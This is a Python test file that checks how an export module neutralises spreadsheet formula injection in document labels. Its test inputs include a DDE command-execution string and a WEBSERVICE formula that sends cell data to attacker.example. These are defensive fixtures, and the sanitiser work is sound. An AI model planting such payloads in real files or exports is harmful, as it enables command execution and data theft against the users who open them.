# MIT License
#
# Copyright (c) 2026 Ganesh Kambli
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

"""
tests/utils/test_excel_export_sanitization.py
---------------------------------------------
Tests for spreadsheet formula injection defences in the export helpers
(issue #2180).

Document labels come from uploaded filenames. Excel, LibreOffice Calc and
Google Sheets evaluate any cell whose text begins with ``=``, ``+``, ``-``,
``@`` or a leading tab/CR, so a file named ``=HYPERLINK("http://evil","x")``
used to become a live formula in the report a reviewer opens.
"""

import io

import pandas as pd
import pytest

from src.utils.excel_export import (
    FORMULA_TRIGGER_PREFIXES,
    _truncate_title,
    build_similarity_workbook,
    generate_csv_matrix_stream,
    generate_tsv_matrix_stream,
    sanitize_spreadsheet_value,
)

# ── sanitize_spreadsheet_value ─────────────────────────────────────────────────


@pytest.mark.parametrize("prefix", list(FORMULA_TRIGGER_PREFIXES))
def test_every_formula_trigger_prefix_is_neutralised(prefix):
    """The security property: the result cannot start a formula.

    Two mechanisms achieve this. Printable triggers (``=+-@``) are quoted;
    whitespace triggers (tab, CR) are removed outright by the control-character
    strip, which leaves plain text with no trigger at all. Either outcome is
    safe, so assert the property rather than one specific mechanism.
    """
    result = sanitize_spreadsheet_value(f"{prefix}SUM(A1:A9)")

    assert result.startswith("'") or not result.startswith(FORMULA_TRIGGER_PREFIXES)


@pytest.mark.parametrize(
    "payload",
    [
        '=HYPERLINK("https://attacker.example","Click")',
        "=1+1",
        "+1+1",
        "-1+1",
        "@SUM(A1:A9)",
        '=cmd|" /C calc"!A0',
        '=WEBSERVICE("https://attacker.example/?d="&A1)',
    ],
)
def test_known_injection_payloads_are_quoted(payload):
    result = sanitize_spreadsheet_value(payload)
    assert result.startswith("'")
    assert not result.lstrip("'").startswith("'")  # exactly one quote added


@pytest.mark.parametrize(
    "benign",
    [
        "essay.docx",
        "Report 2024.pdf",
        "student_1.txt",
        "O'Brien & Co.docx",
        "  leading spaces.txt",
        "1_numbered.docx",
        "",
    ],
)
def test_benign_values_are_left_alone(benign):
    assert sanitize_spreadsheet_value(benign) == benign


@pytest.mark.parametrize("value", [0.85, 1, 0, None, True, 3.14159])
def test_non_string_values_pass_through_unchanged(value):
    assert sanitize_spreadsheet_value(value) is value


def test_numeric_cell_type_is_preserved():
    """Similarity scores must stay floats, not become quoted text."""
    result = sanitize_spreadsheet_value(0.85)
    assert isinstance(result, float)
    assert result == 0.85


def test_control_characters_are_stripped():
    """A leading CR/LF could hide the trigger from a naive prefix check."""
    result = sanitize_spreadsheet_value("\r\n=1+1")
    assert "\r" not in result
    assert "\n" not in result
    assert result.startswith("'=")


def test_embedded_control_characters_are_removed():
    assert sanitize_spreadsheet_value("a\x00b\x1fc") == "abc"


def test_sanitization_is_idempotent():
    once = sanitize_spreadsheet_value("=1+1")
    assert sanitize_spreadsheet_value(once) == once


# ── _truncate_title ────────────────────────────────────────────────────────────


def test_truncate_title_accepts_non_string_labels():
    """A numeric DataFrame index used to raise TypeError."""
    assert _truncate_title(12345) == "12345"


def test_truncate_title_truncates_long_names():
    result = _truncate_title("x" * 100)
    assert len(result) == 60
    assert result.endswith("...")


def test_truncate_title_leaves_short_names_alone():
    assert _truncate_title("short.docx") == "short.docx"


# ── workbook export ────────────────────────────────────────────────────────────


@pytest.fixture
def malicious_matrix():
    """A similarity matrix whose document labels are formula payloads."""
    labels = ['=HYPERLINK("https://attacker.example","x")', "@SUM(A1)", "safe.docx"]
    return pd.DataFrame(
        [[1.0, 0.5, 0.2], [0.5, 1.0, 0.3], [0.2, 0.3, 1.0]],
        index=labels,
        columns=labels,
    )


def test_workbook_headers_are_sanitized(malicious_matrix):
    ws = build_similarity_workbook(malicious_matrix).active

    for col_idx in range(2, 5):
        value = ws.cell(row=1, column=col_idx).value
        if value.lstrip("'").startswith(FORMULA_TRIGGER_PREFIXES):
            assert value.startswith("'"), f"unsanitized header: {value!r}"


def test_workbook_index_labels_are_sanitized(malicious_matrix):
    ws = build_similarity_workbook(malicious_matrix).active

    for row_idx in range(2, 5):
        value = ws.cell(row=row_idx, column=1).value
        if value.lstrip("'").startswith(FORMULA_TRIGGER_PREFIXES):
            assert value.startswith("'"), f"unsanitized label: {value!r}"


def test_workbook_safe_label_is_unchanged(malicious_matrix):
    ws = build_similarity_workbook(malicious_matrix).active
    labels = {ws.cell(row=r, column=1).value for r in range(2, 5)}
    assert "safe.docx" in labels


def test_workbook_similarity_values_remain_numeric(malicious_matrix):
    ws = build_similarity_workbook(malicious_matrix).active

    for row_idx in range(2, 5):
        for col_idx in range(2, 5):
            assert isinstance(ws.cell(row=row_idx, column=col_idx).value, float)


def test_workbook_builds_with_non_string_labels():
    """Integer document IDs as the index must not raise."""
    df = pd.DataFrame([[1.0, 0.4], [0.4, 1.0]], index=[101, 202], columns=[101, 202])

    ws = build_similarity_workbook(df).active

    assert ws.cell(row=2, column=1).value == "101"


# ── CSV stream export ──────────────────────────────────────────────────────────


def test_csv_stream_sanitizes_header_and_index(malicious_matrix):
    chunks = list(generate_csv_matrix_stream(malicious_matrix))
    full_csv = "".join(chunks)

    # No field may begin a formula. Quoting in the CSV means checking the
    # parsed values rather than the raw text.
    parsed = list(io.StringIO(full_csv))
    assert parsed  # sanity

    reader = pd.read_csv(io.StringIO(full_csv), index_col=0)
    for label in list(reader.index) + list(reader.columns):
        assert not str(label).startswith(
            FORMULA_TRIGGER_PREFIXES
        ), f"unsanitized CSV label: {label!r}"


def test_csv_stream_preserves_row_count(malicious_matrix):
    chunks = list(generate_csv_matrix_stream(malicious_matrix))
    assert len(chunks) == len(malicious_matrix) + 1


def test_csv_stream_leaves_benign_matrix_untouched():
    """The existing round-trip behaviour must not regress."""
    data = {
        "DocA.txt": [1.0, 0.85, 0.12],
        "DocB.txt": [0.85, 1.0, 0.45],
        "DocC.txt": [0.12, 0.45, 1.0],
    }
    df = pd.DataFrame(data, index=["DocA.txt", "DocB.txt", "DocC.txt"])

    full_csv = "".join(generate_csv_matrix_stream(df))
    reconstructed = pd.read_csv(io.StringIO(full_csv), index_col=0)

    # check_names=False: read_csv adopts the "Document" header as the index
    # name, which is a pandas-version detail unrelated to sanitization.
    pd.testing.assert_frame_equal(df, reconstructed, check_names=False)


def test_csv_stream_keeps_similarity_values_numeric(malicious_matrix):
    full_csv = "".join(generate_csv_matrix_stream(malicious_matrix))
    reconstructed = pd.read_csv(io.StringIO(full_csv), index_col=0)

    assert reconstructed.dtypes.apply(lambda d: d.kind == "f").all()


# ── TSV stream export ──────────────────────────────────────────────────────────


def test_tsv_stream_sanitizes_header_and_index(malicious_matrix):
    chunks = list(generate_tsv_matrix_stream(malicious_matrix))
    full_tsv = "".join(chunks)

    parsed = list(io.StringIO(full_tsv))
    assert parsed  # sanity

    reader = pd.read_csv(io.StringIO(full_tsv), sep="\t", index_col=0)
    for label in list(reader.index) + list(reader.columns):
        assert not str(label).startswith(
            FORMULA_TRIGGER_PREFIXES
        ), f"unsanitized TSV label: {label!r}"


def test_tsv_stream_preserves_row_count(malicious_matrix):
    chunks = list(generate_tsv_matrix_stream(malicious_matrix))
    assert len(chunks) == len(malicious_matrix) + 1


def test_tsv_stream_leaves_benign_matrix_untouched():
    data = {
        "DocA.txt": [1.0, 0.85, 0.12],
        "DocB.txt": [0.85, 1.0, 0.45],
        "DocC.txt": [0.12, 0.45, 1.0],
    }
    df = pd.DataFrame(data, index=["DocA.txt", "DocB.txt", "DocC.txt"])

    full_tsv = "".join(generate_tsv_matrix_stream(df))
    reconstructed = pd.read_csv(io.StringIO(full_tsv), sep="\t", index_col=0)

    pd.testing.assert_frame_equal(df, reconstructed, check_names=False)


def test_tsv_stream_keeps_similarity_values_numeric(malicious_matrix):
    full_tsv = "".join(generate_tsv_matrix_stream(malicious_matrix))
    reconstructed = pd.read_csv(io.StringIO(full_tsv), sep="\t", index_col=0)

    assert reconstructed.dtypes.apply(lambda d: d.kind == "f").all()
